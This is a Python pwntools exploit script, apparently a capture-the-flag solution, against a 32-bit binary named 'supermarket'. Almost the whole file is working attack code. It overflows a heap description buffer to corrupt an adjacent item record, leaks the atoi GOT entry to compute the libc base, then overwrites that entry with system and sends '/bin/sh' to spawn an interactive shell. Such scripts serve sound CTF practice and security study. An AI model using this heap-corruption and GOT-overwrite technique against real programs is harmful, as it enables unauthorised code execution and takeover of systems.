#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

elf = ELF('./supermarket')

if argv[1] == 'r':
    io = remote()
    libc = ELF('./libc.so.6')

else:
    io = process('./supermarket')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    raw_input('debug > ')

def add(name, price, des_size, description):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('name:', name)
    io.sendlineafter('price:', str(price))
    io.sendlineafter('size:', str(des_size))
    io.sendlineafter('tion:', description)

def delete(name):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('name', name)

def change_des(name, size, description):
    io.sendlineafter('>>', '5')
    io.sendlineafter('name:', name)
    io.sendlineafter('size:', str(size))
    io.sendlineafter('description:', description)

def list_commodity():
    io.sendlineafter('>>', '3')

if __name__ == '__main__':
    add('aaaa', 100, 0x90, 'AAAA') # to split
    add('bbbb', 100, 0x20, 'BBBB')
    # add('cccc', 100, 0x20, 'CCCC')
    # delete('bbbb')
    change_des('aaaa', 0x95, '') # to split from unssorted bin
    add('cccc', 100, 0x60, 'CCCC')  # use the 0x90 space exactly 0x1c+4 + 0x6c+4
    # list_commodity()

    # leak the address of atoi got
    padding = 'c'*4 + '\x00' * 12 + p32(100) + p32(0x60)
    padding += p32(elf.got['atoi']) + p32(0x69) + 'CCCC'
    change_des('aaaa', 0x90, padding)
    list_commodity()
    io.recvuntil('cccc: price.100, des.')
    atoi_addr = u32(io.recv(4))
    success('atoi got -> {:#x}'.format(atoi_addr))
    libc_base = atoi_addr - libc.sym['atoi']
    success('libc base -> {:#x}'.format(libc_base))
    sys_addr = libc_base + libc.sym['system']
    success('system addr -> {:#x}'.format(sys_addr))

    # change atoi_got to system
    change_des('cccc', 0x60, p32(sys_addr))
    # bingo!
    io.sendlineafter('>> ', '/bin/sh')

    io.interactive()



